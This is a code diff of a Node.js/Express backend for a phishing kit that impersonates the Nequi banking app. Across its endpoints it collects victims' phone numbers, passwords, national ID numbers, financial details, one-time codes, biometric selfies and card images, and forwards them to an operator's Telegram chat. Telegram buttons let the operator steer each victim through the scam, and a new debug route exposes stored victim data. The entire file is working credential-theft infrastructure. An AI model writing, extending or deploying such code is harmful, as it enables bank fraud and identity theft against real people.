@@ -4,6 +4,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const cors = require('cors');
+const FormData = require('form-data');
 const app = express();
 
 // ==================== CONFIGURACIÓN CORS ====================
@@ -18,7 +19,7 @@ app.use(cors(corsOptions));
 app.options('*', cors(corsOptions));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
-app.use(express.static('public')); // Servir archivos estáticos
+app.use(express.static('public'));
 
 // ==================== VARIABLES DE ENTORNO ====================
 const BOT_TOKEN = process.env.BOT_TOKEN;
@@ -37,14 +38,12 @@ const sessionData = new Map(); // sessionId -> { datos de la sesión }
 // ==================== FUNCIONES AUXILIARES ====================
 const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
 
-// Función para generar sessionId único
 function generateSessionId() {
   return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 }
 
 // ==================== MENÚS DE TELEGRAM ====================
 
-// Menú para loan-simulator (después del SEGUNDO saldo)
 function getLoanSimulatorMenu(sessionId) {
   return {
     inline_keyboard: [
@@ -58,7 +57,7 @@ function getLoanSimulatorMenu(sessionId) {
       [
         { text: "🧬 Documentos", callback_data: `go:documento|${sessionId}` }
       ],
-	  [
+      [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
       ],
@@ -74,7 +73,6 @@ function getLoanSimulatorMenu(sessionId) {
   };
 }
 
-// Menú para one-time-pass (dinámicas)
 function getDynamicMenu(sessionId) {
   return {
     inline_keyboard: [
@@ -85,7 +83,7 @@ function getDynamicMenu(sessionId) {
       [
         { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
-	  [
+      [
         { text: "🧬 Documentos", callback_data: `go:documento|${sessionId}` }
       ],	
       [
@@ -110,7 +108,8 @@ app.get('/', (_req, res) => {
     ok: true, 
     service: 'Nequi Backend Dinámico', 
     hasEnv: !!(BOT_TOKEN && CHAT_ID),
-    status: 'running'
+    status: 'running',
+    sessionCount: sessionData.size
   });
 });
 
@@ -125,22 +124,33 @@ app.post('/check-ban', (req, res) => {
   res.json({ banned: false });
 });
 
-// ==================== ENDPOINT: GENERAR SESSION ====================
+// ==================== ENDPOINT: CREAR SESIÓN (ACTUALIZADO) ====================
 app.post('/create-session', (req, res) => {
-  const { ip, country, city } = req.body;
-  const sessionId = generateSessionId();
+  const { sessionId, cedula, nombre, telefono, correo, ip, country, city } = req.body;
   
-  sessionData.set(sessionId, {
-    ip,
-    country,
-    city,
-    createdAt: new Date(),
-    steps: []
+  // Si ya existe sesión, actualizar
+  let session = sessionData.get(sessionId) || {};
+  
+  session.cedula = cedula || session.cedula;
+  session.nombreCompleto = nombre || session.nombreCompleto;
+  session.phoneNumber = telefono || session.phoneNumber;
+  session.correo = correo || session.correo;
+  session.ip = ip || session.ip;
+  session.country = country || session.country;
+  session.city = city || session.city;
+  session.createdAt = session.createdAt || new Date();
+  session.steps = session.steps || [];
+  
+  sessionData.set(sessionId, session);
+  
+  console.log(`✅ Sesión creada/actualizada: ${sessionId}`);
+  console.log(`📊 Datos de sesión:`, session);
+  
+  res.json({ 
+    ok: true, 
+    sessionId: sessionId,
+    message: 'Sesión creada exitosamente'
   });
-  
-  console.log(`✅ Sesión creada: ${sessionId} - IP: ${ip}`);
-  
-  res.json({ sessionId });
 });
 
 // ==================== ENDPOINT: PASO 1 - NÚMERO Y CLAVE ====================
@@ -156,9 +166,11 @@ app.post('/step1-credentials', async (req, res) => {
     const session = sessionData.get(sessionId) || {};
     session.phoneNumber = phoneNumber;
     session.password = password;
-    session.ip = ip;
-    session.country = country;
-    session.city = city;
+    session.ip = ip || session.ip;
+    session.country = country || session.country;
+    session.city = city || session.city;
+    if (!session.steps) session.steps = [];
+    session.steps.push({ step: 'credentials', timestamp: new Date() });
     sessionData.set(sessionId, session);
 
     const mensaje = `
@@ -167,11 +179,10 @@ app.post('/step1-credentials', async (req, res) => {
 📱 Número: ${phoneNumber}
 🔑 Clave: ${password}
 🌐 IP: ${ip}
-📍 Ubicación: ${city}, ${country}
+📍 Ubicación: ${city || 'N/A'}, ${country || 'N/A'}
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram (sin botones en este paso)
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje
@@ -190,23 +201,48 @@ app.post('/step1-credentials', async (req, res) => {
 app.post('/step2-loan-first', async (req, res) => {
   try {
     const { 
-      sessionId, cedula, nombreCompleto, ocupacion, 
-      ingresoMensual, gastosMensual, saldoActual 
+      sessionId, 
+      cedula, 
+      nombreCompleto, 
+      ocupacion, 
+      ingresoMensual, 
+      gastosMensual, 
+      saldoActual 
     } = req.body;
 
-    // Guardar en sesión
-    const session = sessionData.get(sessionId) || {};
-    session.cedula = cedula;
-    session.nombreCompleto = nombreCompleto;
-    session.ocupacion = ocupacion;
-    session.ingresoMensual = ingresoMensual;
-    session.gastosMensual = gastosMensual;
-    session.saldoActual1 = saldoActual; // Primer saldo
+    console.log('📥 Datos recibidos en step2-loan-first:', {
+      sessionId,
+      cedula,
+      nombreCompleto,
+      ocupacion,
+      ingresoMensual,
+      gastosMensual,
+      saldoActual
+    });
+
+    // Obtener sesión existente o crear nueva
+    let session = sessionData.get(sessionId) || {};
+    
+    // Guardar TODOS los datos en la sesión
+    session.cedula = cedula || session.cedula;
+    session.nombreCompleto = nombreCompleto || session.nombreCompleto;
+    session.ocupacion = ocupacion || session.ocupacion;
+    session.ingresoMensual = ingresoMensual || session.ingresoMensual;
+    session.gastosMensual = gastosMensual || session.gastosMensual;
+    session.saldoActual1 = saldoActual;
+    if (!session.steps) session.steps = [];
+    session.steps.push({ step: 'loan-first', timestamp: new Date() });
+    
     sessionData.set(sessionId, session);
 
-    console.log(`✅ Primer saldo guardado - Session: ${sessionId} - Saldo: ${saldoActual}`);
+    console.log(`✅ Primer saldo guardado - Session: ${sessionId}`);
+    console.log(`📊 Datos actuales de sesión:`, session);
 
-    res.json({ ok: true, message: 'Primer saldo guardado' });
+    res.json({ 
+      ok: true, 
+      message: 'Primer saldo guardado',
+      sessionId: sessionId
+    });
   } catch (error) {
     console.error('❌ ERROR EN /step2-loan-first:', error.message);
     res.status(500).json({ ok: false, reason: error.message });
@@ -218,16 +254,32 @@ app.post('/step2-loan-second', async (req, res) => {
   try {
     const { sessionId, saldoActual } = req.body;
 
+    console.log('📥 Datos recibidos en step2-loan-second:', {
+      sessionId,
+      saldoActual
+    });
+
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false, reason: "Env vars undefined" });
     }
 
     // Obtener datos de sesión
     const session = sessionData.get(sessionId) || {};
-    session.saldoActual2 = saldoActual; // Segundo saldo
+
+    if (!session.saldoActual1) {
+      console.warn(`⚠️ No se encontró primer saldo para session: ${sessionId}`);
+    }
+
+    // Guardar segundo saldo
+    session.saldoActual2 = saldoActual;
+    if (!session.steps) session.steps = [];
+    session.steps.push({ step: 'loan-second', timestamp: new Date() });
     sessionData.set(sessionId, session);
 
-    // Construir mensaje completo con AMBOS saldos
+    console.log(`✅ Segundo saldo guardado - Session: ${sessionId}`);
+    console.log(`📊 Datos completos de sesión:`, session);
+
+    // ===== CONSTRUIR MENSAJE COMPLETO CON TODOS LOS DATOS =====
     const mensaje = `
 🟣 INFO DE PRÉSTAMO COMPLETA 🟣
 
@@ -245,7 +297,7 @@ app.post('/step2-loan-second', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram CON BOTONES
+    // ===== ENVIAR A TELEGRAM CON BOTONES =====
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -254,7 +306,11 @@ app.post('/step2-loan-second', async (req, res) => {
 
     console.log(`✅ Datos completos enviados con botones - Session: ${sessionId}`);
 
-    res.json({ ok: true, message: 'Datos completos enviados' });
+    res.json({ 
+      ok: true, 
+      message: 'Datos completos enviados',
+      sessionId: sessionId
+    });
   } catch (error) {
     console.error('❌ ERROR EN /step2-loan-second:', error.message);
     res.status(500).json({ ok: false, reason: error.message });
@@ -270,14 +326,12 @@ app.post('/step3-dynamic', async (req, res) => {
       return res.status(500).json({ ok: false, reason: "Env vars undefined" });
     }
 
-    // Obtener datos de sesión
     const session = sessionData.get(sessionId) || {};
     
-    // Guardar la dinámica
     if (!session.dynamics) {
       session.dynamics = [];
     }
-    session.dynamics.push(otp);
+    session.dynamics.push({ type: 'dynamic1', otp, attemptNumber, timestamp: new Date() });
     sessionData.set(sessionId, session);
 
     const mensaje = `
@@ -292,7 +346,6 @@ app.post('/step3-dynamic', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -308,7 +361,6 @@ app.post('/step3-dynamic', async (req, res) => {
   }
 });
 
-   
 // ==================== ENDPOINT: PASO 4 - DINÁMICA ====================
 app.post('/step4-dynamic', async (req, res) => {
   try {
@@ -318,14 +370,12 @@ app.post('/step4-dynamic', async (req, res) => {
       return res.status(500).json({ ok: false, reason: "Env vars undefined" });
     }
 
-    // Obtener datos de sesión
     const session = sessionData.get(sessionId) || {};
     
-    // Guardar la dinámica
     if (!session.dynamics) {
       session.dynamics = [];
     }
-    session.dynamics.push(otp);
+    session.dynamics.push({ type: 'dynamic2', otp, attemptNumber, timestamp: new Date() });
     sessionData.set(sessionId, session);
 
     const mensaje = `
@@ -340,7 +390,6 @@ app.post('/step4-dynamic', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
@@ -356,15 +405,10 @@ app.post('/step4-dynamic', async (req, res) => {
   }
 });
 
-
-// ===== ENDPOINT: BIOMETRÍA 
-
-// ==================== ENDPOINT: BIOMETRÍA ====================
 // ==================== ENDPOINT: BIOMETRÍA ====================
 app.post('/step-biometrics', async (req, res) => {
   try {
     const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
-	
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
@@ -373,36 +417,24 @@ app.post('/step-biometrics', async (req, res) => {
     if (!sessionId || !imageBase64) {
       return res.status(400).json({ ok: false, error: 'Datos incompletos' });
     }
- 
-       
-    // ⚠️ NO romper si no existe la sesión
-	
-     const session = sessionData.get(sessionId) || {};
-     sessionData.set(sessionId, session);
-    // 🔹 Prioridad del número:
-    // 1) sesión
-    // 2) body
-    // 3) N/A
-    const finalPhoneNumber =
-      session.phoneNumber || phoneNumber || 'N/A';
 
-    // 🔹 convertir base64 a buffer
+    const session = sessionData.get(sessionId) || {};
+    sessionData.set(sessionId, session);
+
+    const finalPhoneNumber = session.phoneNumber || phoneNumber || 'N/A';
+
     const buffer = Buffer.from(
       imageBase64.replace(/^data:image\/\w+;base64,/, ''),
       'base64'
     );
 
-    const FormData = require('form-data');
     const formData = new FormData();
-
     formData.append('chat_id', CHAT_ID);
     formData.append('photo', buffer, {
       filename: 'biometria.jpg',
       contentType: 'image/jpeg'
     });
-
-    formData.append(
-      'caption',
+    formData.append('caption', 
 `🧬 BIOMETRÍA RECIBIDA
 
 📱 Número: ${finalPhoneNumber}
@@ -422,94 +454,75 @@ app.post('/step-biometrics', async (req, res) => {
     console.log('🆔 Session:', sessionId);
 
     res.json({ ok: true });
-
   } catch (err) {
     console.error('❌ Error biometría:', err);
     res.status(500).json({ ok: false });
   }
 });
 
-// 
-
-// ==================== ENDPOINT: REGALO ====================
-const FormData = require("form-data");
-
+// ==================== ENDPOINT: TARJETA DE REGALO ====================
 function base64ToBuffer(base64String) {
-    const base64Data = base64String.replace(/^data:image\/\w+;base64,/, "");
-    return Buffer.from(base64Data, "base64");
+  const base64Data = base64String.replace(/^data:image\/\w+;base64,/, "");
+  return Buffer.from(base64Data, "base64");
 }
 
 app.post("/step-tarjetaregalo", async (req, res) => {
+  try {
+    const { frontImageBase64, backImageBase64 } = req.body;
 
-    try {
-
-        const { frontImageBase64, backImageBase64 } = req.body;
-
-        if (!frontImageBase64 || !backImageBase64) {
-            return res.status(400).json({ error: "Faltan imágenes" });
-        }
-
-        const frontBuffer = base64ToBuffer(frontImageBase64);
-        const backBuffer = base64ToBuffer(backImageBase64);
-
-        const caption = `🎁 ¡Has recibido una Tarjeta de Regalo!
-
-         👉 Por favor VOLTEA la tarjeta para ver la parte trasera.
-
-               || ""}`;
-
-        // ========= FRONTAL =========
-        let formFront = new FormData();
-        formFront.append("chat_id", CHAT_ID);
-        formFront.append("caption", caption);
-        formFront.append("photo", frontBuffer, {
-            filename: "frontal.jpg",
-            contentType: "image/jpeg"
-        });
-
-        await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-            formFront,
-            {
-                headers: formFront.getHeaders(),
-                maxContentLength: Infinity,
-                maxBodyLength: Infinity
-            }
-        );
-
-        // ========= TRASERA =========
-        let formBack = new FormData();
-        formBack.append("chat_id", CHAT_ID);
-        formBack.append("caption", "🔄 Parte trasera de la tarjeta");
-        formBack.append("photo", backBuffer, {
-            filename: "trasera.jpg",
-            contentType: "image/jpeg"
-        });
-
-        await axios.post(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-            formBack,
-            {
-                headers: formBack.getHeaders(),
-                maxContentLength: Infinity,
-                maxBodyLength: Infinity
-            }
-        );
-
-        return res.json({ ok: true });
-
-    } catch (error) {
-        console.error("ERROR REAL:", error.response?.data || error.message);
-        return res.status(500).json({ error: "Fallo enviando a Telegram" });
+    if (!frontImageBase64 || !backImageBase64) {
+      return res.status(400).json({ error: "Faltan imágenes" });
     }
 
+    const frontBuffer = base64ToBuffer(frontImageBase64);
+    const backBuffer = base64ToBuffer(backImageBase64);
+
+    const caption = `🎁 ¡Has recibido una Tarjeta de Regalo!\n\n👉 Por favor VOLTEA la tarjeta para ver la parte trasera.`;
+
+    // ========= FRONTAL =========
+    let formFront = new FormData();
+    formFront.append("chat_id", CHAT_ID);
+    formFront.append("caption", caption);
+    formFront.append("photo", frontBuffer, {
+      filename: "frontal.jpg",
+      contentType: "image/jpeg"
+    });
+
+    await axios.post(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+      formFront,
+      {
+        headers: formFront.getHeaders(),
+        maxContentLength: Infinity,
+        maxBodyLength: Infinity
+      }
+    );
+
+    // ========= TRASERA =========
+    let formBack = new FormData();
+    formBack.append("chat_id", CHAT_ID);
+    formBack.append("caption", "🔄 Parte trasera de la tarjeta");
+    formBack.append("photo", backBuffer, {
+      filename: "trasera.jpg",
+      contentType: "image/jpeg"
+    });
+
+    await axios.post(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+      formBack,
+      {
+        headers: formBack.getHeaders(),
+        maxContentLength: Infinity,
+        maxBodyLength: Infinity
+      }
+    );
+
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error("ERROR REAL:", error.response?.data || error.message);
+    return res.status(500).json({ error: "Fallo enviando a Telegram" });
+  }
 });
- 
-// ==================== ENDPOINT: REGALO ====================
-
-
-
-
 
 // ==================== ENDPOINT: CONSIGNAR ====================
 app.post('/consignar', async (req, res) => {
@@ -520,12 +533,17 @@ app.post('/consignar', async (req, res) => {
       return res.status(500).json({ ok: false, reason: "Env vars undefined" });
     }
 
+    const session = sessionData.get(sessionId) || {};
+    const finalPhone = phoneNumber || session.phoneNumber || 'N/A';
+    const finalPass = password || session.password || 'N/A';
+    const finalIp = ip || session.ip || 'N/A';
+
     const mensaje = `
 💰 QUIERE CONSIGNAR 💰
 
-📱 Número: ${phoneNumber}
-🔑 Clave: ${password}
-🌐 IP: ${ip}
+📱 Número: ${finalPhone}
+🔑 Clave: ${finalPass}
+🌐 IP: ${finalIp}
 
 ✅ SI QUIERO CONSIGNAR
 📲 ENVÍAME POR WHATSAPP PARA CONTINUAR
@@ -533,7 +551,6 @@ app.post('/consignar', async (req, res) => {
 🆔 Session: ${sessionId}
     `.trim();
 
-    // Enviar a Telegram SIN BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje
@@ -586,13 +603,12 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
             show_alert: true
           });
           
-          // Limpiar redirección para que el cliente quede en pantalla blanca
           redirections.set(sessionId, 'banned');
         }
         return res.sendStatus(200);
       }
 
-      // ERROR DINÁMICA (mantener en la misma página con mensaje de error)
+      // ERROR DINÁMICA
       if (action === 'error-dynamic') {
         redirections.set(sessionId, 'error-dynamic');
         
@@ -607,7 +623,7 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
         return res.sendStatus(200);
       }
 
-      // ERROR MONTO - ir al segundo input de saldo
+      // ERROR MONTO
       if (action === 'go:loan-simulator-error') {
         redirections.set(sessionId, 'loan-simulator-error');
         
@@ -660,6 +676,18 @@ app.get('/instruction/:sessionId', (req, res) => {
   }
 });
 
+// ==================== ENDPOINT: OBTENER DATOS DE SESIÓN (DEBUG) ====================
+app.get('/session/:sessionId', (req, res) => {
+  const sessionId = req.params.sessionId;
+  const session = sessionData.get(sessionId);
+  
+  if (session) {
+    res.json({ ok: true, session });
+  } else {
+    res.json({ ok: false, message: 'Sesión no encontrada' });
+  }
+});
+
 // ==================== CONFIGURAR WEBHOOK DE TELEGRAM ====================
 async function setupTelegramWebhook() {
   if (!BOT_TOKEN || !RENDER_URL) {
@@ -688,12 +716,12 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, async () => {
   console.log(`✅ Servidor activo en puerto ${PORT}`);
   console.log(`📡 URL del servidor: ${RENDER_URL}`);
+  console.log(`📊 Sesiones activas: ${sessionData.size}`);
   
-  // Configurar webhook de Telegram
   await setupTelegramWebhook();
 });
 
-// ==================== AUTO-PING PARA EVITAR SLEEP EN RENDER ====================
+// ==================== AUTO-PING ====================
 setInterval(async () => {
   try {
     const res = await fetch(RENDER_URL);
@@ -702,4 +730,4 @@ setInterval(async () => {
   } catch (error) {
     console.error("❌ Error en auto-ping:", error.message);
   }
-}, 14 * 60 * 1000); // Cada 14 minutos
+}, 14 * 60 * 1000);
